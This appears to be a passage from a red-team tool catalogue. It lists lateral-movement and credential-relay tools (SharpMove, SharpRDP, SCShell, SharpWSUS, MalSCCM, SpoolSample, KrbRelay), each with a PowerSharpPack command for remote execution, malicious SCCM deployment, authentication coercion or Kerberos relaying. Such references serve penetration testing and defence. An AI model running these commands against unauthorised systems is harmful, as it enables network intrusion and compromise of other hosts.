
**SharpMove**  
.NET Project for performing Authenticated Remote Execution.  
@Credit to: https://github.com/0xthirteen/SharpMove  
```bash
PowerSharpPack -SharpMove -Command "execute /target:TargetMachine"
```

**SharpRDP**  
Remote Desktop Protocol .NET Console Application for Authenticated Command Execution.  
@Credit to: https://github.com/0xthirteen/SharpRDP  
```bash
PowerSharpPack -SharpRDP -Command "execute /command:cmd.exe"
```

**SCShell**  
A fileless lateral movement tool that relies on ChangeServiceConfigA to run commands remotely on a target system.  
@Credit to: https://github.com/Mr-Un1k0d3r/SCShell  
```bash
PowerSharpPack -SCShell -Command "run /target:192.168.1.10 /service:Spooler"
```

**SharpWSUS**  
SharpWSUS is a CSharp tool for lateral movement through WSUS.  
@Credit to: https://github.com/nettitude/SharpWSUS  
```bash
PowerSharpPack -SharpWSUS -Command "exploit"
```

**MalSCCM**  
This tool allows you to abuse local or remote SCCM servers to deploy malicious applications to hosts they manage.  
@Credit to: https://github.com/nettitude/MalSCCM  
```bash
PowerSharpPack -MalSCCM -Command "exploit /target:TargetMachine"
```

**SpoolSample**  
PoC tool to coerce Windows hosts to authenticate to other machines via the MS-RPRN RPC interface.  
@Credit to: https://github.com/leechristensen/SpoolSample  
```bash
PowerSharpPack -SpoolSample -Command "coerce /target:TargetMachine"
```

**KrbRelay**  
Framework for Kerberos relaying.  
@Credit to: https://github.com/cube0x0/KrbRelay  
```bash
PowerSharpPack -KrbRelay -Command "relay"
```

